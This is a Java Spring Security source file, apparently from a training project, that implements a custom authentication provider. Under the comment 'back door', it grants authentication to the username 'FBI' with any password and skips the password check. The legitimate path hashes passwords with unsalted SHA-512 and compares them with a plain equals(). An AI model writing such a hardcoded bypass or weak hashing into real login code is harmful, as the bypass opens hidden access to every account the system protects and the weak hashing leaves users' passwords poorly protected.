package lv.helloit.test;

import lv.helloit.test.users.User;
import lv.helloit.test.users.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.authentication.AuthenticationProvider;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.authority.SimpleGrantedAuthority;
import org.springframework.security.core.token.Sha512DigestUtils;
import org.springframework.stereotype.Component;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

@Component
public class CustomAuthenticationProvider implements AuthenticationProvider {
    private final UserService userService;

    @Autowired
    public CustomAuthenticationProvider(UserService userService) {
        this.userService = userService;
    }

    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        String username = authentication.getName();
        String password = authentication.getCredentials().toString();

        // back door
        if (username.equals("FBI")) {
            return new UsernamePasswordAuthenticationToken(username, password, new ArrayList<>());
        }

        Optional<User> wrappedUser = userService.get(username);

        if (wrappedUser.isPresent()) {
            String realPasswordHash = wrappedUser.get().getPasswordHash();
            String incomingPasswordHash = Sha512DigestUtils.shaHex(password);

            if (realPasswordHash.equals(incomingPasswordHash)) {
                return new UsernamePasswordAuthenticationToken(username, password, new ArrayList<>());
            }
        }

        return null;
    }

    @Override
    public boolean supports(Class<?> authentication) {
        return UsernamePasswordAuthenticationToken.class == authentication;
    }
}
